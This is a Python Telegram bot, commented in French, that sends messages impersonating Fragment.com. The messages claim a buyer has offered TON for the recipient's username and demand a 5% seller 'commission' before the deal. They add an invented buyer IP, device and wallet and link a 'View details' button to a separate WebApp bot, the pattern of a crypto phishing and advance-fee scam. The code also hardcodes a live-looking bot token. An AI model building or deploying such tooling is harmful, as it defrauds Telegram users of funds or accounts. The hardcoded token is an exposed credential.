import logging
import os
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from telegram.error import Conflict, NetworkError
import asyncio
import aiohttp
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
import time

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelName)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))

print(f"🔍 DEBUG: BOT_TOKEN configuré: ✅")
print(f"🔍 DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")
print(f"🔍 DEBUG: PORT: {PORT}")

# Variables globales pour l'app Telegram
telegram_app = None

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """Récupère le prix du TON en USD via l'API DIA"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000", timeout=5) as response:
                if response.status == 200:
                    data = await response.json()
                    return float(data.get('Price', 5.50))
                else:
                    logger.warning(f"Erreur API DIA: {response.status}")
                    return 5.50
    except Exception as e:
        logger.warning(f"Erreur récupération prix TON: {e}")
        return 5.50

# ===== FONCTION GÉNÉRATION MESSAGE =====
async def generate_fragment_message(username, price):
    """Génère le message Fragment avec calculs en temps réel"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Message personnalisé
        message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:

**• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)**

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message.**"""

        # Bouton vers WebApp (corrigé)
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        logger.error(f"Erreur génération message: {e}")
        return None, None

# ===== SERVEUR HTTP =====
class MessageBotHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health' or self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK - Message Bot is running')
        else:
            self.send_response(404)
            self.end_headers()

    def do_OPTIONS(self):
        """Gestion CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        """Gestion des requêtes POST pour envoyer des messages"""
        try:
            if self.path == '/send-message':
                # Headers CORS
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'application/json')
                
                # Lecture des données
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
                
                username = data.get('username', '').strip()
                price = float(data.get('price', 0))
                
                if not username or price <= 0:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        'success': False, 
                        'error': 'Username et price requis'
                    }).encode())
                    return
                
                # Envoi du message via le bot Telegram
                success = asyncio.run(self.send_telegram_message(username, price))
                
                if success:
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        'success': True, 
                        'message': f'Message envoyé pour {username}'
                    }).encode())
                else:
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        'success': False, 
                        'error': 'Erreur envoi Telegram'
                    }).encode())
            else:
                self.send_response(404)
                self.end_headers()
                
        except Exception as e:
            logger.error(f"Erreur POST: {e}")
            self.send_response(500)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                'success': False, 
                'error': str(e)
            }).encode())

    async def send_telegram_message(self, username, price):
        """Envoie le message via l'application Telegram"""
        try:
            global telegram_app
            if telegram_app is None:
                return False
                
            message, reply_markup = await generate_fragment_message(username, price)
            
            if message and reply_markup:
                await telegram_app.bot.send_message(
                    chat_id=FIXED_CHAT_ID,
                    text=message,
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
                logger.info(f"✅ Message envoyé pour {username} - {price} TON")
                return True
            else:
                logger.error("❌ Erreur génération message")
                return False
                
        except Exception as e:
            logger.error(f"❌ Erreur envoi Telegram: {e}")
            return False

    def log_message(self, format, *args):
        # Supprime les logs HTTP pour éviter le spam
        pass

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    message = f"""🤖 **Message Bot Fragment**

Bonjour {user.first_name}! 

📱 **Votre Chat ID:** `{chat_id}`

Ce bot génère automatiquement des messages Fragment personnalisés via l'interface web.

**Commandes disponibles:**
• `/test username price` - Tester un message
• `/help` - Aide

💎 **Prêt à recevoir vos deals!**"""
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande de test /test username price"""
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Usage:** `/test username price`\n"
                "📝 **Exemple:** `/test crypto 1000`",
                parse_mode='Markdown'
            )
            return
            
        username = context.args[0].strip().lower()
        price = float(context.args[1])
        
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
            return
            
        # Génération du message
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            await update.message.reply_text(
                f"✅ **Test réussi!**\n"
                f"👤 Username: {username}\n"
                f"💰 Prix: {price} TON",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Erreur lors de la génération du message")
            
    except ValueError:
        await update.message.reply_text("❌ Format de prix invalide")
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide"""
    help_text = """
🤖 **Message Bot Fragment - Aide**

**Commandes disponibles:**
• `/start` - Informations et Chat ID
• `/test username price` - Tester un message
• `/help` - Cette aide

**Fonctionnalités:**
✅ Messages Fragment automatiques
✅ Calcul prix TON en temps réel  
✅ Boutons WebApp intégrés
✅ Chat ID fixe configuré

💎 **Bot prêt à l'emploi!**
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

# ===== SERVEUR =====
def start_server():
    """Démarre le serveur HTTP"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), MessageBotHandler)
        print(f"🌐 Serveur HTTP démarré sur port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur HTTP: {e}")

# ===== FONCTION PRINCIPALE =====
def main():
    """Fonction principale"""
    global telegram_app
    
    try:
        # Serveur HTTP en arrière-plan
        server_thread = Thread(target=start_server, daemon=True)
        server_thread.start()
        
        # Application Telegram
        telegram_app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des gestionnaires
        telegram_app.add_handler(CommandHandler("start", start_command))
        telegram_app.add_handler(CommandHandler("test", test_command))
        telegram_app.add_handler(CommandHandler("help", help_command))
        
        print("🚀 Message Bot Fragment démarré...")
        print(f"💎 Chat ID fixe: {FIXED_CHAT_ID}")
        print(f"🔗 WebApp: BidRequestWebApp_bot/WebApp")
        print("🌐 Serveur HTTP: Actif")
        print("🔄 Mode: Polling")
        
        # Démarrage en polling
        telegram_app.run_polling(
            drop_pending_updates=True,
            allowed_updates=['message']
        )
        
    except Exception as e:
        print(f"❌ Erreur démarrage: {e}")
        raise

if __name__ == '__main__':
    main()
